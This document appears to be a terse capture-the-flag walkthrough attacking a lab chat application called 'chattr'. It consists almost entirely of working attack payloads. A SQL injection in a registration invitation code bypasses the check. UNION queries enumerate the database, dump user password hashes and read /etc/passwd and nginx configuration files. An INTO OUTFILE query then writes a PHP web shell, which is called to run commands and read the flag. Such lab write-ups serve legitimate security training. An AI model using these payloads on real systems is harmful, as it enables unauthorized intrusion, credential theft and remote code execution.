**What is the password hash for the user 'admin'?
- Launch Burp Suite
```
POST /api/register.php HTTP/1.1
Host: 83.136.255.170:31361
Cookie: PHPSESSID=4rh8ent1bs7bbar10i9692ffd3
Content-Length: 113
Cache-Control: max-age=0
Sec-Ch-Ua: "Not=A?Brand";v="24", "Chromium";v="140"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Origin: https://83.136.255.170:31361
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://83.136.255.170:31361/register.php
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive

username=a&password=123qazWSX%21%40%23&repeatPassword=123qazWSX%21%40%23&invitationCode=abcd-efgh-1234' OR '1'='1
```
- Created an account and login

```
') UNION ALL SELECT 1,2,schema_name,4 from INFORMATION_SCHEMA.SCHEMATA-- -
') UNION ALL SELECT 1,2,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.TABLES where table_schema='chattr'-- -
') UNION ALL SELECT 1,2,COLUMN_NAME,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS where table_name='Users'-- -
') UNION ALL SELECT 1,2,Username,Password from chattr.Users-- -
```

**What is the root path of the web application?
```
') UNION ALL SELECT 1,2,user(),4-- -
') UNION ALL SELECT 1,2,privilege_type,4 FROM information_schema.user_privileges WHERE grantee="'chattr_dbUser'@'localhost'"-- -
') UNION ALL SELECT 1,2,LOAD_FILE("/etc/passwd"),4-- -
') UNION ALL SELECT 1,2,LOAD_FILE("/etc/nginx/nginx.conf"),4-- -
') UNION ALL SELECT 1,2,LOAD_FILE("/etc/nginx/sites-enabled/default"),4-- -
```

**Achieve remote code execution, and submit the contents of /flag_XXXXXX.txt below.
```
') UNION ALL SELECT 1,2,variable_name,variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
') UNION ALL SELECT 1,2,'file written successfully!',4 into outfile '/var/www/chattr-prod/proof.txt'-- -
') UNION ALL SELECT 1,2,LOAD_FILE("/var/www/chattr-prod/proof.txt"),4-- -
') UNION SELECT "","",'<?php system($_REQUEST[0]); ?>',"" into outfile '/var/www/chattr-prod/shell.php'-- -
```
Visit
```
https://94.237.121.111:34267/shell.php?0=id
https://94.237.121.111:34267/shell.php?0=ls%20/
https://94.237.121.111:34267/shell.php?0=cat%20/flag_876a4c.txt
```
